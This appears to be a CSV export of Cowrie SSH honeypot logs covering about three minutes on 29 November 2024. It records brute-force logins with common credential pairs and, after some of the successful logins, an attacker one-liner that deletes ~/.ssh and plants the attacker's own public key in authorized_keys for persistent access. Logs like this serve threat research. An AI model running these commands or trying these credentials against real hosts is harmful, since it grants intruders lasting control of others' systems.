eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.log.closed,62.60.152.146,,,,4d2ba610fdd2,,,,,Closing TTY Log: var/lib/cowrie/tty/7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804 after 0 seconds,localhost,2024-11-29T06:57:03.207166Z
cowrie.session.closed,62.60.152.146,,,,4d2ba610fdd2,,,,,Connection lost after 1 seconds,localhost,2024-11-29T06:57:03.207830Z
cowrie.session.connect,52.165.31.201,18504,172.233.154.19,2222,82cb775b2437,ssh,,,,New connection: 52.165.31.201:18504 (172.233.154.19:2222) [session: 82cb775b2437],localhost,2024-11-29T06:57:40.901948Z
cowrie.client.version,52.165.31.201,,,,82cb775b2437,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:57:40.906781Z
cowrie.client.kex,52.165.31.201,,,,82cb775b2437,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:57:40.979090Z
cowrie.login.success,52.165.31.201,,,,82cb775b2437,,,,,login attempt [root/qwe@123] succeeded,localhost,2024-11-29T06:57:41.214272Z
cowrie.session.params,52.165.31.201,,,,82cb775b2437,,,,,[],localhost,2024-11-29T06:57:41.340196Z
cowrie.command.input,52.165.31.201,,,,82cb775b2437,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-29T06:57:41.340762Z
cowrie.command.failed,52.165.31.201,,,,82cb775b2437,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-29T06:57:41.341444Z
cowrie.log.closed,52.165.31.201,,,,82cb775b2437,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-29T06:57:41.505642Z
cowrie.session.params,52.165.31.201,,,,82cb775b2437,,,,,[],localhost,2024-11-29T06:57:41.581197Z
cowrie.command.input,52.165.31.201,,,,82cb775b2437,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-29T06:57:41.581578Z
cowrie.session.file_download,52.165.31.201,,,,82cb775b2437,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-29T06:57:41.635174Z
cowrie.log.closed,52.165.31.201,,,,82cb775b2437,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-29T06:57:41.635659Z
cowrie.session.connect,52.165.31.201,14501,172.233.154.19,2222,6e36fcbe0337,ssh,,,,New connection: 52.165.31.201:14501 (172.233.154.19:2222) [session: 6e36fcbe0337],localhost,2024-11-29T06:57:41.686031Z
cowrie.client.version,52.165.31.201,,,,6e36fcbe0337,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:57:41.693179Z
cowrie.client.kex,52.165.31.201,,,,6e36fcbe0337,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:57:41.743190Z
cowrie.login.failed,52.165.31.201,,,,6e36fcbe0337,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-29T06:57:42.015639Z
cowrie.session.closed,52.165.31.201,,,,6e36fcbe0337,,,,,Connection lost after 1 seconds,localhost,2024-11-29T06:57:43.073416Z
cowrie.session.connect,52.165.31.201,51889,172.233.154.19,2222,04a9f3376235,ssh,,,,New connection: 52.165.31.201:51889 (172.233.154.19:2222) [session: 04a9f3376235],localhost,2024-11-29T06:57:43.128921Z
cowrie.client.version,52.165.31.201,,,,04a9f3376235,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:57:43.129434Z
cowrie.client.kex,52.165.31.201,,,,04a9f3376235,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:57:43.187152Z
cowrie.login.success,52.165.31.201,,,,04a9f3376235,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-29T06:57:43.437654Z
cowrie.session.closed,52.165.31.201,,,,82cb775b2437,,,,,Connection lost after 2 seconds,localhost,2024-11-29T06:57:43.488526Z
cowrie.session.closed,52.165.31.201,,,,04a9f3376235,,,,,Connection lost after 0 seconds,localhost,2024-11-29T06:57:43.489075Z
cowrie.session.connect,154.216.19.22,48826,172.233.154.19,2222,9b7eca8408d5,ssh,,,,New connection: 154.216.19.22:48826 (172.233.154.19:2222) [session: 9b7eca8408d5],localhost,2024-11-29T06:58:26.917180Z
cowrie.client.version,154.216.19.22,,,,9b7eca8408d5,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:58:26.917841Z
cowrie.client.kex,154.216.19.22,,,,9b7eca8408d5,,,98f63c4d9c87edbd97ed4747fa031019,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 98f63c4d9c87edbd97ed4747fa031019,localhost,2024-11-29T06:58:27.088415Z
cowrie.login.failed,154.216.19.22,,,,9b7eca8408d5,,,,,login attempt [hadoop/123456] failed,localhost,2024-11-29T06:58:27.602509Z
cowrie.session.closed,154.216.19.22,,,,9b7eca8408d5,,,,,Connection lost after 1 seconds,localhost,2024-11-29T06:58:28.775137Z
cowrie.session.connect,62.60.152.146,42252,172.233.154.19,2222,fb9bc2dae1ad,ssh,,,,New connection: 62.60.152.146:42252 (172.233.154.19:2222) [session: fb9bc2dae1ad],localhost,2024-11-29T06:58:31.810151Z
cowrie.session.connect,62.60.152.146,58322,172.233.154.19,2222,dfc611cf4677,ssh,,,,New connection: 62.60.152.146:58322 (172.233.154.19:2222) [session: dfc611cf4677],localhost,2024-11-29T06:58:31.811141Z
cowrie.client.version,62.60.152.146,,,,dfc611cf4677,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:58:31.811520Z
cowrie.client.version,62.60.152.146,,,,fb9bc2dae1ad,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:58:31.814794Z
cowrie.client.kex,62.60.152.146,,,,dfc611cf4677,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T06:58:31.993887Z
cowrie.client.kex,62.60.152.146,,,,fb9bc2dae1ad,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T06:58:32.004337Z
cowrie.login.failed,62.60.152.146,,,,dfc611cf4677,,,,,login attempt [uftp/123456] failed,localhost,2024-11-29T06:58:32.549612Z
cowrie.login.failed,62.60.152.146,,,,fb9bc2dae1ad,,,,,login attempt [ftp/ftp] failed,localhost,2024-11-29T06:58:32.701679Z
cowrie.session.closed,62.60.152.146,,,,dfc611cf4677,,,,,Connection lost after 1 seconds,localhost,2024-11-29T06:58:33.736464Z
cowrie.session.closed,62.60.152.146,,,,fb9bc2dae1ad,,,,,Connection lost after 2 seconds,localhost,2024-11-29T06:58:33.885242Z
cowrie.session.connect,62.60.152.146,49776,172.233.154.19,2222,bd42eaa13c33,ssh,,,,New connection: 62.60.152.146:49776 (172.233.154.19:2222) [session: bd42eaa13c33],localhost,2024-11-29T06:58:44.551653Z
cowrie.client.version,62.60.152.146,,,,bd42eaa13c33,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:58:44.552298Z
cowrie.client.kex,62.60.152.146,,,,bd42eaa13c33,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T06:58:44.724322Z
cowrie.login.failed,62.60.152.146,,,,bd42eaa13c33,,,,,login attempt [awsgui/awsgui] failed,localhost,2024-11-29T06:58:45.242801Z
cowrie.session.closed,62.60.152.146,,,,bd42eaa13c33,,,,,Connection lost after 1 seconds,localhost,2024-11-29T06:58:46.415399Z
cowrie.session.connect,52.165.31.201,25561,172.233.154.19,2222,2d6793ed14ce,ssh,,,,New connection: 52.165.31.201:25561 (172.233.154.19:2222) [session: 2d6793ed14ce],localhost,2024-11-29T06:59:07.433200Z
cowrie.client.version,52.165.31.201,,,,2d6793ed14ce,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:59:07.433832Z
cowrie.client.kex,52.165.31.201,,,,2d6793ed14ce,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:59:07.490571Z
cowrie.login.success,52.165.31.201,,,,2d6793ed14ce,,,,,login attempt [root/Qweasdzxc] succeeded,localhost,2024-11-29T06:59:07.761480Z
cowrie.session.params,52.165.31.201,,,,2d6793ed14ce,,,,,[],localhost,2024-11-29T06:59:07.915320Z
cowrie.command.input,52.165.31.201,,,,2d6793ed14ce,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-29T06:59:07.915680Z
cowrie.command.failed,52.165.31.201,,,,2d6793ed14ce,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-29T06:59:07.916369Z
cowrie.log.closed,52.165.31.201,,,,2d6793ed14ce,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-29T06:59:08.089597Z
cowrie.session.params,52.165.31.201,,,,2d6793ed14ce,,,,,[],localhost,2024-11-29T06:59:08.223777Z
cowrie.command.input,52.165.31.201,,,,2d6793ed14ce,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-29T06:59:08.224189Z
cowrie.session.file_download,52.165.31.201,,,,2d6793ed14ce,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-29T06:59:08.283360Z
cowrie.log.closed,52.165.31.201,,,,2d6793ed14ce,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-29T06:59:08.283774Z
cowrie.session.connect,52.165.31.201,34437,172.233.154.19,2222,d885a8fbc7f1,ssh,,,,New connection: 52.165.31.201:34437 (172.233.154.19:2222) [session: d885a8fbc7f1],localhost,2024-11-29T06:59:08.338045Z
cowrie.client.version,52.165.31.201,,,,d885a8fbc7f1,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:59:08.341196Z
cowrie.client.kex,52.165.31.201,,,,d885a8fbc7f1,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:59:08.400261Z
cowrie.login.failed,52.165.31.201,,,,d885a8fbc7f1,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-29T06:59:08.629982Z
cowrie.session.closed,52.165.31.201,,,,d885a8fbc7f1,,,,,Connection lost after 1 seconds,localhost,2024-11-29T06:59:09.687093Z
cowrie.session.connect,52.165.31.201,55129,172.233.154.19,2222,a3b51e540e53,ssh,,,,New connection: 52.165.31.201:55129 (172.233.154.19:2222) [session: a3b51e540e53],localhost,2024-11-29T06:59:09.737448Z
cowrie.client.version,52.165.31.201,,,,a3b51e540e53,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T06:59:09.738069Z
cowrie.client.kex,52.165.31.201,,,,a3b51e540e53,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T06:59:09.794129Z
cowrie.login.success,52.165.31.201,,,,a3b51e540e53,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-29T06:59:10.059395Z
cowrie.session.closed,52.165.31.201,,,,2d6793ed14ce,,,,,Connection lost after 2 seconds,localhost,2024-11-29T06:59:10.117615Z
cowrie.session.closed,52.165.31.201,,,,a3b51e540e53,,,,,Connection lost after 0 seconds,localhost,2024-11-29T06:59:10.118344Z
cowrie.session.connect,62.60.152.146,58378,172.233.154.19,2222,cd557cb32b11,ssh,,,,New connection: 62.60.152.146:58378 (172.233.154.19:2222) [session: cd557cb32b11],localhost,2024-11-29T06:59:29.342014Z
cowrie.client.version,62.60.152.146,,,,cd557cb32b11,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:59:29.342542Z
cowrie.client.kex,62.60.152.146,,,,cd557cb32b11,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T06:59:29.515105Z
cowrie.login.failed,62.60.152.146,,,,cd557cb32b11,,,,,login attempt [yarn/yarn] failed,localhost,2024-11-29T06:59:30.030642Z
cowrie.session.closed,62.60.152.146,,,,cd557cb32b11,,,,,Connection lost after 1 seconds,localhost,2024-11-29T06:59:31.208641Z
cowrie.session.connect,62.60.152.146,37294,172.233.154.19,2222,35cdbe321e13,ssh,,,,New connection: 62.60.152.146:37294 (172.233.154.19:2222) [session: 35cdbe321e13],localhost,2024-11-29T06:59:42.047183Z
cowrie.client.version,62.60.152.146,,,,35cdbe321e13,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T06:59:42.060549Z
cowrie.client.kex,62.60.152.146,,,,35cdbe321e13,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T06:59:42.224717Z
cowrie.login.failed,62.60.152.146,,,,35cdbe321e13,,,,,login attempt [test2/test2] failed,localhost,2024-11-29T06:59:43.145241Z
cowrie.session.closed,62.60.152.146,,,,35cdbe321e13,,,,,Connection lost after 2 seconds,localhost,2024-11-29T06:59:44.318047Z
cowrie.session.connect,62.60.152.146,53660,172.233.154.19,2222,a302e4143aff,ssh,,,,New connection: 62.60.152.146:53660 (172.233.154.19:2222) [session: a302e4143aff],localhost,2024-11-29T07:00:30.081259Z
cowrie.client.version,62.60.152.146,,,,a302e4143aff,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T07:00:30.081897Z
cowrie.client.kex,62.60.152.146,,,,a302e4143aff,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-29T07:00:30.273425Z
cowrie.login.failed,62.60.152.146,,,,a302e4143aff,,,,,login attempt [guest/123456] failed,localhost,2024-11-29T07:00:30.799387Z
cowrie.session.connect,52.165.31.201,31467,172.233.154.19,2222,9fdb8fca0ffa,ssh,,,,New connection: 52.165.31.201:31467 (172.233.154.19:2222) [session: 9fdb8fca0ffa],localhost,2024-11-29T07:00:31.896262Z
cowrie.client.version,52.165.31.201,,,,9fdb8fca0ffa,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T07:00:31.897461Z
cowrie.client.kex,52.165.31.201,,,,9fdb8fca0ffa,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T07:00:31.946774Z
cowrie.session.closed,62.60.152.146,,,,a302e4143aff,,,,,Connection lost after 1 seconds,localhost,2024-11-29T07:00:32.015350Z
cowrie.login.success,52.165.31.201,,,,9fdb8fca0ffa,,,,,login attempt [root/Admin@Qwert!@#] succeeded,localhost,2024-11-29T07:00:32.157065Z
cowrie.session.params,52.165.31.201,,,,9fdb8fca0ffa,,,,,[],localhost,2024-11-29T07:00:32.294789Z
cowrie.command.input,52.165.31.201,,,,9fdb8fca0ffa,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-29T07:00:32.295160Z
cowrie.command.failed,52.165.31.201,,,,9fdb8fca0ffa,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-29T07:00:32.295768Z
